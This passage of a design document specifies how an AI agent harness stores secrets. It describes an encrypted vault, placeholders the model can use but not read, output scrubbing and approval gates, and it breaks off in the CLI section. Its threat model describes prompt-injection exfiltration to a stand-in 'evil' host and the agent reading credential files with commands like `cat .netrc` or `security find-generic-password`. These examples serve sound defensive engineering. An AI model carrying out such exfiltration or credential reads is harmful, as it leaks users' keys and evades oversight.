# 37 — Secrets: named, versioned values the agent can use but never read

Status: as-built v0 · 2026-09-16 (draft rev 2 the same day: credentials.yaml
moves in, five versions per secret, agent update/restore; §15 records what
the build changed and wins where it disagrees) · extends
`00-architecture.md` §4 (tool contract, permission gate), §6 (shell/jobs
output), §9 (data dir), §10 (crate table); **replaces**
`01-config-and-subagents.md` §1.3 (`credentials.yaml`) and the precedence
line of `05-oauth.md` §3; relies on `07-context.md` §6 (tool output is
bounded where it is appended), `08-repl.md` §3–4 (python host calls are
`Invoke`), `14-jobs.md` (job output paths), `28-untrusted-content.md`
(sinks — a draft; §8 says what this doc does before and after it lands),
`25-desktop.md` §3 (parity), `32-nodes.md` §5.1 (servers without a
keyboard). Wins over 01 §1.3 and 05 §3 where they disagree. Every claim
about wth cites `file:line` as of this tree.

## 0. Decisions in one screen

1. **A secret is a name with up to five versions.** The model sees names,
   notes, version numbers and dates; no tool returns a value, ever.
   `secret_list` is the only read. Rejected: a `secret_get` for "trusted"
   sessions — there is no trusted session, and one read tool makes every
   other guarantee here a prompt-injection target (28 §1:
   `GET https://evil/?k=<secret>` is one `read_url` call).
2. **Use = placeholder in any tool argument.** `{{secret:NAME}}` is the
   current value, `{{secret:NAME:-1}}` the one before it, down to
   `{{secret:NAME:-4}}`. It goes inside any string argument of any tool — a
   `shell` command, a `read_url` header, `write_file` content, a `start`
   env value, an MCP tool field. `tools::registry::invoke`
   (`registry.rs:464-495`) swaps in the value *after* the approval gate and
   *before* `tool.call`. `ToolCallStarted.args` (`loop_.rs:1751-1758`),
   `ApprovalRequested.args` (`approval.rs:38-49`) and `HistoryEntry::Tool`
   carry the model's args, so every frontend, the approval card and the
   store show the placeholder for free. Rejected: per-tool `secret`
   parameters (N schemas for one idea; MCP tools cannot grow one); an env
   var the shell exports (`SECRET_X`) — shell-only, and the persistent
   brush `Shell` keeps env across calls so `env` prints it later.
3. **Output is scrubbed.** Every kept version of every value (and its
   base64) is replaced with its placeholder in tool output at four sites:
   the `ToolOutput` returned by `invoke` (`content` and `structured`),
   shell/pty job output (live chunks, final render, the on-disk log —
   `jobs.rs`), the python cell result (`repl.rs` `finish_output`), and
   nowhere else because those are the only paths text takes into the
   frame, the store (`store.rs:198`), `spill/`, `runtime/<session>.monty`
   and the UIs. One `aho-corasick` automaton, rebuilt when the vault
   changes. This is defence in depth for *accidents* (`env`, `curl -v`,
   `cat .env`); a model that pipes a value through `rev` defeats it and
   that is what the gate (4) is for. Rejected: no scrubbing ("the model has
   no read tool") — `cat .netrc` is not a read tool and leaks anyway; a
   scanner for "things that look like secrets" (28 §0.4's argument:
   heuristics false-positive and do not hold).
4. **A placeholder makes the call at least `Ask`.** In `gate`
   (`registry.rs:270-296`): if the args mention a secret,
   `action = action.max(Ask)` before the approval switches apply. `shell`
   already asks; this catches `read_url`, `browser_open`, `search_web`,
   every MCP tool — `ReadOnly` tools that a secret in the args turns into
   egress. `/approvals off` still silences it (the user's consent to not
   be asked); `Deny` is never rewritten. When 28 lands, "mentions a secret"
   is one more way a call is `consequential` and the tainted rule applies
   unchanged. Rejected: a `secrets.ask_on_use` knob (a second policy;
   00 §4 says there is one) and never asking (an injected page + one
   `ReadOnly` network tool = exfiltration with zero prompts).
5. **New values come from the user's keyboard, a tool's output, or an
   older version — never from the model's arguments.** `secret_request`
   opens a masked field in the TUI / desktop (the `ask_user` actor shape,
   `tools/src/ask.rs`) and returns `stored` or `declined`. `secret_capture`
   runs one tool through `Invoke` (its own gate applies) and stores the
   output — trimmed, or the first capture group of `pattern` — as a new
   version, returning a receipt with a byte count. `secret_restore` makes
   an older version current again. Updating an existing name is allowed
   from all three (`replace: true` on capture, so a typo does not clobber
   the wrong name); every update is a new version and the four before it
   stay reachable, so a wrong update costs one `secret_restore`. Rejected:
   `secret_set { name, value }` — a value in the args is already in the
   context and in `messages.body`; the fix is to not put it there, and the
   prompt block says so. `secret_delete` — the user deletes, and deletion
   is the one operation versions cannot undo.
6. **Encrypted vault, key in the OS keychain, file fallback.**
   `<data_dir>/secrets.vault` is one XChaCha20-Poly1305 blob
   (`chacha20poly1305`, already in the lock via `snow`); the 32-byte key
   lives in the OS keychain through `keyring` (macOS Keychain, Windows
   Credential Manager, Linux secret-service), or in `<data_dir>/secrets.key`
   mode 0600 when no keychain is reachable (`secrets.key_store`). Why
   01 §1.3's rejection no longer stands: (a) the user asked for encryption;
   (b) the Tauri build 01 said to wait for exists (00 §12 phase 19); (c)
   the adversary is *the agent itself* running `read_file ~/.wth/secrets.*`
   or `security find-generic-password` as the user. A 0600 file does not
   stop the same user; a keychain item's ACL does (the `security` CLI
   prompts). Rejected: `age` (recipients, armor, not in tree — for one
   symmetric key); SQLCipher (native lib, for tens of rows); a passphrase
   (`argon2` is in the lock, but a headless daemon has nobody to type it).
7. **`credentials.yaml` moves into the vault and is deleted.** Provider
   keys (`anthropic`, `openai`, gateway names), web keys (`firecrawl`,
   `brave`, `github`) and Slack tokens (`slack_bot`, `slack_app`) are
   secrets like any other, under the names they had — one store, one UI,
   one encryption story, and the agent may now `curl` an API it has a key
   for with `{{secret:anthropic}}`. In-process consumers (genai's auth
   resolver, `web`, `search-providers`, `slack`) read through a
   `secrets::Handle` — an `Arc<Vault>` handed out by the actor to
   in-process code, never over the wire (the `knowledge::Handle` shape,
   plugins.md §3.4). The first start imports the file version by version
   (source `import`) and unlinks it: a plaintext copy beside a vault is
   not encryption. `runtime::credentials()` and `DEFAULT_CREDENTIALS` go.
   Precedence stays: vault beats `/login` beats env. Rejected: a
   `credentials` backend under §11 (two stores, two UIs, for the same
   kind of thing); keeping the file as an unencrypted fallback (it would
   be the one everyone edits).
8. **Servers get a CLI.** A node or service box (32 §5.1) has no TUI, and
   the file it used to `vi` over ssh is gone: `wth --secret-set NAME`
   (value from the tty with echo off, or from stdin when piped),
   `--secret-rm NAME`, `--secret-list`. It opens the vault as a library,
   the running daemon sees the change on its next read (§3.5 mtime
   reload). `wth --slack-setup` writes its tokens the same way.
   Rejected: `set_secret` over the relay only — pairing needs a main
   harness that already has a key.
9. **Names are namespaced for backends that do not exist yet.** A local
   name is `[A-Za-z0-9_.-]{1,64}`; `/` is reserved so v1 can address
   `{{secret:bitwarden/github-pat}}`. A backend is a plugin that sends
   `RegisterBackend(Arc<dyn Backend>)` to the secrets actor at start (the
   `RegisterUserSink` / `RegisterNode` shape, `agent/src/user.rs:75-84`,
   `supervisor.rs:235-243`) — additive; the local vault is always there
   and is where a backend's own client secret lives. v0 ships the vault as
   a plain struct and the trait only in §11 of this doc, not in code
   (docs/plugins.md §2 rule 2; no interface with one implementation).
10. **A plugin, `crates/secrets`, directly above `tools`.** Own file on
    disk, own actor, own tools, own event stream, own config section —
    `docs/plugins.md` §1's row. It sits at `runtime ← tools ← secrets ←
    …` so every credential reader (`web`, `search-providers`, `agent`,
    `slack`) can depend on it. The expansion/scrub *hook* lives in `tools`
    (`tools::secrets`, §3.4) because `tools` cannot depend upward and four
    call sites in two crates read it.

## 1. What exists

| Layer | wth today | Cite |
|---|---|---|
| Credential storage | `credentials.yaml` plaintext, 0600, warn if wider; `oauth/<ns>.json` 0600; MCP tokens 0600; link identity 0600 | `runtime/src/lib.rs:203-224`, `agent/src/providers.rs:270-288`, `oauth/src/lib.rs:446-447`, `link/src/identity.rs:89-90` |
| Credential readers | `runtime::credentials(data_dir)` once at start: agent `Auth { creds: Arc<HashMap> }` cloned into genai's `with_auth_resolver_fn`; `web` engines; `search-providers`; `slack` tokens; `--slack-setup` | `agent/src/supervisor.rs:2371-2549`, `web/src/lib.rs:104-109`, `search-providers/src/lib.rs:168`, `slack/src/lib.rs:361-363`, `slack/src/setup.rs:142-168` |
| Credential writers | `upsert_credential`/`remove_credential` (line-preserving YAML, atomic 0600) from `/provider add|rm`; `--slack-setup`; `first_run` writes the commented template | `agent/src/providers.rs:134-178, 254-266`, `slack/src/setup.rs:210`, `wth/src/main.rs:185-189, 248-260` |
| Encryption in tree | `snow` (Noise), `sha2`; `chacha20poly1305 0.10`, `aes-gcm 0.10`, `zeroize 1.9`, `hkdf`, `aho-corasick 1.1`, `argon2 0.5` in `Cargo.lock` transitively; no `keyring`, no `rpassword` | `Cargo.toml:63-193`, `Cargo.lock` |
| Tool dispatch choke point | `Message<Invoke>` → `gate` → spawned `invoke(tool, spec, call, approval)`; approval sees `call.args`; then `tool.call(call.args, cx)`; `ToolOutput` returned untouched. No hook/middleware concept | `tools/src/registry.rs:432-495` |
| Who publishes args/output | agent publishes `ToolCallStarted { args }` *before* `Invoke` and `ToolCallFinished { output }` from the returned `ToolOutput`; same in the python bridge | `agent/src/loop_.rs:1751-1830`, `agent/src/repl.rs:1012-1064` |
| Where tool text lands | `spill::cap` → `ToolResponse` → `Store::append` (`messages.body`, plaintext JSON); `spill/<session>/<call_id>.txt`; compaction folds tool output into `## Notes`; python heap dump `runtime/<session>.monty` | `loop_.rs:1824-1927`, `store.rs:198-215`, `spill.rs:22-101`, `repl.rs:632-636` |
| Shell output paths that bypass `invoke`'s return | `Jobs`: `Log::push` writes `jobs/<session>/<id>.log` raw, `flush` publishes `JobEvent::Output { chunk }` live, `render` builds the final text for both `ToolOutput` and `JobEvent::Finished`; supervisor injects `<job_result>` from `Finished` | `tools/src/jobs.rs:274-278, 600-611, 684-746`, `agent/src/supervisor.rs:672-730` |
| Python and the environment | worker spawned `env_clear()`; `os.environ` → `{}`; `/cwd` and `/spill` mounted read-only, readable without the cap | `repl.rs:638-643, 1213-1214`, monty-pool `worker.rs:182-201` |
| Env-taking tools | `start` (pty) takes `env: BTreeMap`; `shell` takes only `command`; MCP `command/args/env/url/headers` expand `$VAR`/`$(cmd)` through the user's shell at connect | `tools/src/pty.rs:53-66, 507-529`, `tools/src/shell.rs:22-27`, `tools/src/mcp.rs:1093-1190` |
| Ask-the-user shape | `AskUser` actor: `Request` → mint id, publish `AskRequested`, `timeout`, `AnswerAsk` from any frontend, publish `AskResolved`; `agent::answer_ask` for RPC | `tools/src/ask.rs:26-210`, `agent/src/lib.rs:212-230` |
| Masked input | desktop: one `<Input type="password">` (gateway key); TUI: `/provider add` collects the key in the shared `TextInput` unmasked, never writes it to the transcript (test) | `desktop/ui/src/components/settings/Connections.tsx:189-196`, `tui/src/model.rs:3993-4018, 5927-5948`, `tui/src/ui.rs:402-411` |
| Arg display | `describe` (TUI) / `describe.ts` (desktop) render the model's args; nested objects as one JSON line cut at 120 chars | `tui/src/model.rs:986-1024`, `desktop/ui/src/lib/describe.ts:14-33` |
| Phones | a paired device dispatches into the same `jsonrpsee::Methods`, no per-method filter | `rpc/src/lib.rs:60-83`, `link/src/conn.rs:484-506` |
| One-shot CLI modes | `--slack-setup` runs before the plugin vector, against the data dir directly | `wth/src/main.rs:43-89, 292-295` |
| Downward handle pattern | `RegisterUserSink(Arc<dyn UserSink>)`, `RegisterNode { dialer: Arc<dyn Dialer> }`, `SetDispatch { methods }`; hot-path handle: `knowledge::Handle → Arc<Knowledge>` | `agent/src/user.rs:31-84`, `supervisor.rs:235-249`, `link/src/types.rs:177-184`, plugins.md §3.4 |

The gap in one sentence: the only way the agent can use a token today is to
have it in a file it can read or an env var it can print — both of which put
the value into the context window, the sqlite store, the spill directory and
every frontend — and the harness's own keys sit in plaintext next to them.

## 2. Facts relied on

- **`chacha20poly1305` 0.10** (RustCrypto): `XChaCha20Poly1305::new(&key)`,
  `encrypt(&nonce24, Payload { msg, aad })`. 24-byte random nonces make
  reuse a non-issue without a counter; the tag is 16 bytes. Already
  compiled into every build (snow's `default-resolver`).
- **`keyring` 3** (`apple-native`, `windows-native`, `sync-secret-service`
  features): `Entry::new(service, user)?.set_password / get_password /
  delete_credential`. macOS: a generic password item; the creating binary
  is on the item's ACL, any other process (the `security` CLI, a rebuilt
  unsigned dev binary) triggers the system prompt — the property §0.6
  wants. Linux without a secret-service daemon (servers): `Err(NoStorage)`
  → file fallback. The kernel-keyutils backend is per-boot; not used.
- **`rpassword` 7**: `read_password()` on the controlling tty with echo
  off; ≈300 lines, no deps beyond libc. For `--secret-set`. Rejected:
  driving termios through `nix` ourselves (00 §1.2).
- **`zeroize` 1.9**: `Zeroizing<String>` for values in memory; a one-line
  wrap, already in the lock.
- **`aho-corasick` 1.1** (transitive dep of `regex`): `AhoCorasick::new(
  patterns)?.replace_all_with(text, …)`, leftmost-longest; one pass over
  any output regardless of the number of secrets and versions.
- **`invoke` already leaves the mailbox** (`registry.rs:455`), so a
  nested `Invoke` from `secret_capture` cannot deadlock the registry.
- **genai's auth resolver is a closure called per request**
  (`supervisor.rs:2437-2440`), so a live `Vault` behind it replaces a
  startup snapshot with no API change; today `/provider add` is live only
  for gateways (`Auth.gateways: Arc<RwLock<…>>`, `:2374-2375`) and a new
  `anthropic` key needs a restart. After this doc every key is live.
- **iocraft `TextInput`** has no mask prop (`ui.rs:402-411`); we already
  carry two iocraft patches (`[patch.crates-io]`, 00 §8). A `mask:
  Option<char>` prop is the third (00 §1.3).
- **`AskUser` timeout** is `tools.ask_timeout_secs` (`lib.rs:263-292`);
  a plugin never reads another plugin's section (plugins.md §3.6), so the
  secrets actor has its own `request_timeout_secs`.

## 3. Shape

### 3.1 Placeholder

```
{{secret:NAME}}            current version                      NAME = [A-Za-z0-9_.-]{1,64}
{{secret:NAME:-N}}         N versions before the current, N ∈ 1..=4
{{secret:BACKEND/NAME}}    reserved for §11; v0 returns "unknown secret"
```

Expansion walks every `serde_json::Value::String` leaf of the args (keys
untouched) and replaces each match. Any unknown name or missing version
fails the whole call before dispatch: `ToolOutput::err("unknown secret
NAME; secret_list shows the names")` /
`ToolOutput::err("NAME has 2 versions; :-3 does not exist")`. Partial
expansion never happens. Relative, not absolute, in the placeholder
because the model's intent is "the one before this rotation"; absolute
version numbers (`v7`) are for humans in the list and the restore UI,
and are never reused.

### 3.2 Tools (`crates/secrets/src/tools.rs`)

```rust
/// `secret_list`: names, notes, versions. Never values.
pub struct ListArgs {}
// NAME = "secret_list", RISK = ReadOnly, RETURNS = "list[dict]"
// → one line per secret: `NAME · v7 (3 kept) · note · updated · local`
//   structured: [{name, note, source, current: 7, versions: [{v, created, source}], updated}]
// → empty vault: "no secrets; the user adds them with /secrets add, Settings › Secrets or `wth --secret-set`, or call secret_request"

/// `secret_request`: ask the user to type a secret into a masked field.
pub struct RequestArgs {
    /// Name to store it under. An existing name gets a new version; the user is told.
    pub name: String,
    /// What it is for, shown to the user (`GitHub personal access token with repo scope`).
    pub note: String,
}
// NAME = "secret_request", RISK = ReadOnly, RETURNS = "str"
// → "stored NAME v1" | "stored NAME v4 (v3 is {{secret:NAME:-1}})" | "declined" | "no answer after 1800 s"
//   never the value, never its length

/// `secret_capture`: run one tool and store its output as a secret without seeing it.
pub struct CaptureArgs {
    /// Name to store it under.
    pub name: String,
    /// Tool to run (`shell`, `read_file`, `read_url`, an MCP tool).
    pub tool: String,
    /// Its arguments, exactly as you would call it. Placeholders are allowed.
    pub args: serde_json::Value,
    /// Regex; the first capture group is the value. Default: the whole output, trimmed.
    pub pattern: Option<String>,
    /// Shown in `secret_list`. Kept from the previous version when absent.
    pub note: Option<String>,
    /// Required to add a version to a name that exists (guards against a typo landing on the wrong name).
    #[serde(default)]
    pub replace: bool,
}
// NAME = "secret_capture", RISK = ReadOnly, RETURNS = "str"
// → "stored NAME v1 (32 bytes) from shell"
// → "stored NAME v4 (32 bytes) from shell; v3 is {{secret:NAME:-1}}, secret_restore undoes"
// errors (ToolOutput::err, inner output withheld in every case):
//   "NAME exists (v3); pass replace: true to add v4, or pick another name"
//   "<tool> returned an error (N bytes); output withheld — run it without secret_capture to debug, knowing its output then enters the conversation"
//   "pattern matched nothing in N bytes"
//   "empty output"
//   receipt gains a line "value shorter than 8 characters cannot be scrubbed from tool output" when that is so

/// `secret_restore`: make an older version current again (as a new version; nothing is lost).
pub struct RestoreArgs {
    pub name: String,
    /// How many versions back, 1..=4 — the `:-N` of the placeholder that reaches it.
    pub back: u8,
}
// NAME = "secret_restore", RISK = ReadOnly, RETURNS = "str"
// → "NAME v5 = v3 restored; v4 is {{secret:NAME:-1}}"
// → err "NAME has 2 versions; back: 3 does not exist"
```

Why `ReadOnly` for all four (argued as 10 §6 does for `knowledge_put`):
none of them changes anything outside the harness's own vault, none
returns a value, every write is a new version with the previous four still
reachable, and `secret_capture`'s inner call takes the registry gate on
its own `Risk` plus rule §0.4 if *its* args carry placeholders. This
includes the harness's own keys: a model that replaces `anthropic` breaks
the next model call until `secret_restore` — recoverable, visible on the
tool card, and no different from it editing `credentials.yaml` with `edit`
today. Deletion is the user's.

`secret_capture` calls `ActorRef::<ToolRegistry>::lookup(REGISTRY_ACTOR)
.ask(Invoke(ToolCall { id: format!("{call_id}.capture"), name, args,
session, quiet: true }))`; the inner `ToolOutput.content` is the value
source (for `shell`, the text before the `exit code:` line; `structured`
string when present). It is never logged, never published: the registry's
own `invoke` scrubs *known* values from that output but the new value is
not known yet, so the tool discards the output after extraction. The inner
call is `quiet` (`ToolCall.quiet`, copied onto `ToolCx`): `Jobs` publishes
no `JobEvent`, writes no log, lists no row, and waits for the command to
finish instead of returning a background-job stub — the value exists
nowhere but in the tool's return until `vault.set`.

### 3.3 Actor, commands, events (`crates/secrets/src/lib.rs`)

```rust
pub const SECRETS_ACTOR: &str = "secrets";
/// Versions kept per name. Not config: a sixth is the one nobody asked for.
pub const KEEP: usize = 5;

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(default)]
pub struct SecretsConfig {
    pub key_store: KeyStore,         // Auto
    pub tools: bool,                 // true — the agent-facing surface (§9)
    pub request_timeout_secs: u64,   // 1800
}
#[serde(rename_all = "snake_case")]
pub enum KeyStore { Auto, Keychain, File }

/// Wire-visible. Never a value, never a length.
#[derive(Clone, Debug, Serialize, Deserialize, schemars::JsonSchema, kameo::Reply)]
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
pub struct VersionInfo { pub v: u32, pub created: String, pub source: String /* user | cli | shell | read_url | … | import | restore v3 | provider add */ }
pub struct SecretInfo { pub name: String, pub note: String, pub source: String /* "local" */, pub current: u32, pub versions: Vec<VersionInfo> /* newest first, ≤ KEEP */ }
pub struct SecretsList { pub key_store: String /* "keychain" | "file" */, pub secrets: Vec<SecretInfo> }

/// `ask` → `SecretsList`.
pub struct List;
/// `ask` → `Result<SecretInfo, String>`. A new version; `note: None` keeps the old note.
pub struct Set { pub name: String, pub value: String, pub note: Option<String>, pub source: String }
/// `ask` → `Result<SecretInfo, String>`. Copies version `-back` to the top as a new version.
pub struct Restore { pub name: String, pub back: u8 }
/// `ask` → `Result<(), String>`. The name and every version. User surfaces only.
pub struct Delete { pub name: String }
/// `ask` → `Result<Outcome, String>`; leaves the mailbox, publishes `Requested`, waits `request_timeout_secs`.
pub struct Request { pub session: SessionId, pub name: String, pub note: String }
pub struct Outcome { pub stored: Option<u32> /* new version */, pub timed_out: bool }
/// `ask` → `Option<SessionId>` (the requesting session). `value: None` = declined.
pub struct Answer { pub id: RequestId, pub value: Option<String> }
/// `ask` → `Arc<Vault>`. In-process only (§3.7); `rpc` never exposes it.
pub struct Handle;

#[derive(Clone, Debug, Serialize, Deserialize, schemars::JsonSchema)]
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[serde(tag = "type")]   // variants renamed on the wire: `ScheduleEvent::Changed` already owns `Changed`
pub enum SecretsEvent {
    /// Names, notes, versions or the key store changed; UIs re-`list_secrets`.
    #[serde(rename = "SecretsChanged")]
    Changed,
    /// The model asked for one; frontends show a masked field. `current` is `Some(v)` when the name exists.
    #[serde(rename = "SecretRequested")]
    Requested { id: RequestId, session: SessionId, name: String, note: String, current: Option<u32> },
    #[serde(rename = "SecretResolved")]
    Resolved { id: RequestId, stored: Option<u32>, timed_out: bool },
}
```

`start`: read config → open the key store (§3.5); failure → `error!` and
`Ok(())` — the harness comes up with env-var auth only and `/secrets` says
why. Load or create the vault; import `credentials.yaml` if present
(§3.6). Spawn `SecretsActor`, `register(SECRETS_ACTOR)`. If `cfg.tools`:
`tools::secrets::install(Arc<Vault>)` (§3.4) and, in a task,
`lookup_when::<ToolRegistry>` → `RegisterTool` ×4 + `RegisterPrompt {
plugin: "secrets", text }`.

### 3.4 The hook in `tools` (`crates/tools/src/secrets.rs`, ≈130 lines)

```rust
/// What the registry, jobs and the python bridge need from a vault. One
/// implementation (the `secrets` plugin); `tools` cannot depend on it.
pub trait Secrets: Send + Sync {
    /// `{{secret:NAME}}` / `{{secret:NAME:-N}}` → value in every string leaf. Err = unknown name or version (the whole call fails).
    fn expand(&self, args: &mut serde_json::Value) -> Result<usize, String>;
    /// Every kept version of every value (and its base64) → its placeholder.
    fn redact(&self, text: &str) -> Cow<'_, str>;
}
static INSTALLED: OnceLock<Arc<dyn Secrets>> = OnceLock::new();
pub fn install(s: Arc<dyn Secrets>);                 // second call ignored, logged
pub fn mentions(args: &serde_json::Value) -> bool;    // cheap scan, no vault needed
pub fn expand(args: &mut Value) -> Result<usize, String>;   // no-op Ok(0) when nothing installed
pub fn redact(text: &str) -> Cow<'_, str>;                  // identity when nothing installed
pub fn redact_output(out: &mut ToolOutput);                 // content + every string in structured
```

Why a process-global and not a message: the readers are `ToolRegistry`
(`invoke`, `gate`), `Jobs` (three sites), `mcp::expand` (connect time) and
`agent::repl` (cell output) — four actors across two crates for one
immutable handle set once at start. A `RegisterSecrets` message to each
would be four registration edges and a race with the first tool call.
Precedent for a hot-path handle over repeated asks: `knowledge::Handle`
(plugins.md §3.4). `tracing::subscriber::set_global_default` is the shape.

Call sites, exactly:

| Where | What | Cite |
|---|---|---|
| `ToolRegistry::gate` | `if mentions(&call.args) { action = action.max(PolicyAction::Ask) }` before the switches; `PolicyAction` gains `PartialOrd` (28 §2.1 wants the same) | `registry.rs:270-296` |
| `invoke` | after the approval block: `if let Err(e) = expand(&mut call.args) { return ToolOutput::err(e) }`; after `tool.call`: `redact_output(&mut out)` on all three match arms (an error string may echo args) | `registry.rs:483-494` |
| `Jobs::drain` / `Log::push` | each chunk `redact`ed before the log file, the tail and `JobEvent::Output` — best effort (a value split across two chunks escapes here) | `jobs.rs:274-278, 600-638` |
| `Jobs::run` | `render(&stdout, &stderr)` result `redact`ed once, whole — exact; feeds `ToolOutput`, `JobEvent::Finished.output`, `<job_result>` | `jobs.rs:684-746` |
| `Jobs::Start` / `StartPty` | the job's `command` is scrubbed once at admission; the real string is executed, the scrubbed one is what `JobEvent::Started/Finished`, `JobView` and the `<job_result command=…>` wrapper carry | `jobs.rs`, `pty.rs` |
| `Jobs::Start` with `quiet` | no events, no log file, no `jobs` row, no stub: the reply is always `Done` (the job timeout bounds the wait); the capture's inner shell output reaches only the capture tool | `jobs.rs`, `shell.rs` |
| `Repl::finish_output` | the cell's stdout + repr text `redact`ed — closes `open('/cwd/.env').read()` after a `write_file` that expanded a placeholder | `repl.rs:815-833` |
| `mcp::expand` / `expand_map` | `expand` placeholders in `command/args/env/url/headers` before the shell heredoc, so `"Authorization": "Bearer {{secret:X}}"` in `mcp/*.json` works and nothing is stored in the file | `mcp.rs:1093-1119` |

Not a call site, and why: `ToolCallStarted`/`ApprovalRequested`/history
carry the model's args (placeholders); `spill::cap`, `Store::append`, the
compaction summariser and `tool_result` all consume the already-scrubbed
`ToolOutput`; `ToolOutput.files` are images.

### 3.5 Vault and key (`crates/secrets/src/vault.rs`, `key.rs`)

```
<data_dir>/secrets.vault      truth; b"wth-secrets-1\n" ‖ nonce[24] ‖ XChaCha20-Poly1305(key, nonce, aad = magic, plaintext)
<data_dir>/secrets.key        truth, only with key_store = file (or auto without a keychain); 32 bytes base64, 0600, create_new
keychain item                  truth, service "wth", account "secrets:<absolute data_dir>"; value = 32 bytes base64
```

plaintext:

```json
{"secrets": {
  "anthropic":    {"note": "imported from credentials.yaml", "versions": [
                     {"v": 2, "value": "sk-ant-…", "created": "2026-09-16T10:02:11Z", "source": "user"},
                     {"v": 1, "value": "sk-ant-…", "created": "2026-09-16T09:00:00Z", "source": "import"}]},
  "GITHUB_TOKEN": {"note": "GitHub PAT, repo scope", "versions": [
                     {"v": 1, "value": "ghp_…", "created": "…", "source": "shell"}]}
}}
```

- `versions` newest first, truncated to `KEEP` on every write; `v` is
  per-name monotonic and never reused (a restore of "v3" is unambiguous a
  week later). `note` is per name.
- `Vault` API (all sync, in memory): `get(name, back) -> Option<Zeroizing<String>>`,
  `list() -> Vec<SecretInfo>`, `set(name, value, note, source) -> SecretInfo`,
  `restore(name, back)`, `delete(name)`, `key_store() -> &str`.
- One data dir, one key; two data dirs never share a keychain item.
- Write = serialize → encrypt with a fresh nonce → `atomic_write(tmp, 0600)`
  + `rename` (`agent/src/providers.rs:270-288`'s shape, which moves into
  this crate).
- Load once at open; before every `get`/`list`/`set` the vault `stat`s the
  file and reloads when the mtime moved (skills/knowledge resync by
  mtime, 00 §9) — a TUI, a headless daemon and a `--secret-set` on one
  data dir see each other's changes within one read. Last writer wins;
  secrets are not merged.
- The redaction automaton (`AhoCorasick` over `value` and
  `base64(value)` for every kept version ≥ 8 chars, replacement
  `{{secret:NAME}}` or `{{secret:NAME:-N}}` by position) is rebuilt on
  every load/write and swapped under an `RwLock<Arc<_>>`. Up to `5 × 2 ×
  names` patterns; one pass. URL-encoding is not a pattern: a token
  without reserved characters encodes to itself, one with them is rare
  enough to wait for a transcript.
- `key_store: auto` = try the keychain; on `NoStorage`/platform error fall
  back to the file **and say so** in the log and in `SecretsList.key_store`
  (the `/secrets` header reads `key: file`). `keychain` and `file` force.
  Losing the key loses the vault; the doc for the user is one sentence in
  `harness.md`'s layout table.
- Deleting `secrets.vault` forgets every secret including the provider
  keys; the key stays and the next `set` creates a new vault.

### 3.6 `credentials.yaml` cutover

At vault open, if `<data_dir>/credentials.yaml` exists: parse it as the
flat `name: value` map it is (`runtime/src/lib.rs:203-224`'s parser moves
here for this one use), `set(name, value, "imported from
credentials.yaml", "import")` for every non-empty pair, write the vault,
then `unlink` the file and log `imported N keys from credentials.yaml into
the vault; the file was removed`. A parse error leaves the file alone and
logs it; nothing is half-imported. The TUI shows the log line as an
`Entry::Info` on its first frame; the desktop as a toast.

Consumers, after:

| Consumer | Before | After |
|---|---|---|
| genai auth (`supervisor.rs:2371-2440`) | `Auth.creds: Arc<HashMap>` snapshot; `keys.get(ns)` in the resolver closure | `Auth.vault: Arc<Vault>` from `ask(Handle)`; the closure does `vault.get(ns, 0)` per request — live |
| `configured()` predicate (`:2519-2525`) | `creds.contains_key(ns)` | `vault.get(ns, 0).is_some()` |
| gateways (`providers.rs:80-89, 254-266`) | `creds.get(&name)`; `upsert_credential`/`remove_credential` rewrite the file | `vault.get(&name, 0)`; `Set { source: "provider add" }` / `Delete` on the actor; `providers.yaml` and `models.json` unchanged |
| `web` (`web/src/lib.rs:104`), `search-providers` (`:168`) | `runtime::credentials` at start, sync | `lookup_when::<SecretsActor>` → `ask(Handle)` in the task their `start` already spawns; engines read `vault.get` at build time (a key added later still needs the next start, as today) |
| `slack` (`slack/src/lib.rs:361`) | same | same shape; `slack_bot`/`slack_app` |
| `--slack-setup` (`setup.rs:142, 210`) | `runtime::credentials` + `upsert_credential` | `secrets::Vault::open(&data_dir, &cfg)` directly (runs before plugins, `main.rs:293`); `get`/`set` with source `slack setup` |
| `first_run` (`main.rs:248-260`), `DEFAULT_CREDENTIALS` | writes the template | deleted |
| `runtime::credentials` | the reader | deleted; `runtime` shrinks |
| `harness.md:17, 186-189`, README bullet, 01 §1.3, 05 §3 | describe the file | describe the vault (§14) |

Tests that pin the file format (`providers.rs:336-350`, `setup.rs:352-357,
416-418`) go with it; the setup tests assert against `Vault::list` instead.

### 3.7 `Handle`, and why it is not a read path

`ask(Handle) → Arc<Vault>` gives in-process Rust code `get(name, back)`.
It is the same trust boundary as `runtime::credentials()` had: a crate in
this binary. It is not a `Tool`, not an `Api` method, not serializable;
`rpc` never names it. The agent's *model* reaches the vault only through
`tools::secrets::expand`. If a future plugin wants the handle to answer a
model, that is a read tool and §0.1 says no.

### 3.8 RPC (`crates/rpc/src/api.rs`)

```rust
/// Names, notes, versions, key store. Never values.
#[method(name = "list_secrets")]    async fn list_secrets(&self) -> RpcResult<SecretsList>;
/// Store a new version. The value transits once and is not echoed (a phone's request is Noise-encrypted end to end, 31).
#[method(name = "set_secret")]      async fn set_secret(&self, name: String, value: String, note: Option<String>) -> RpcResult<SecretInfo>;
/// Make version `-back` current again, as a new version.
#[method(name = "restore_secret")]  async fn restore_secret(&self, name: String, back: u8) -> RpcResult<SecretInfo>;
/// The name and all its versions.
#[method(name = "delete_secret")]   async fn delete_secret(&self, name: String) -> RpcResult<()>;
/// Answer a `SecretsEvent::Requested`; `value: null` declines.
#[method(name = "answer_secret")]   async fn answer_secret(&self, id: RequestId, value: Option<String>) -> RpcResult<()>;
```

`fn secrets() -> RpcResult<ActorRef<SecretsActor>>` next to `knowledge()`
(`api.rs:613-620`), error text `"secrets vault unavailable"` (it is never
"disabled": §9). `set_secret` uses `source: "user"`. `forward!` and
`rt.subscribe` gain `SecretsEvent`; `export.rs` gains `SecretInfo`,
`VersionInfo`, `SecretsList`, `SecretsEvent`, `RequestId`. `add_provider`
keeps its signature and writes through the actor. `set_secret` is the
second method after `add_provider` that carries a raw secret over the
wire; both are loopback-token or Noise-encrypted (00 §7, 31 §6).

### 3.9 CLI (`crates/wth/src/main.rs`, `secret_cli.rs` ≈ 80 lines)

```
wth --secret-set NAME [--note "…"]   value: rpassword on a tty (no echo, asked twice), else the first line of stdin
wth --secret-rm NAME
wth --secret-list                     NAME · vN (k kept) · note · updated   (+ "key: file" header)
```

One-shot like `--slack-setup`; `conflicts_with_all` the other modes;
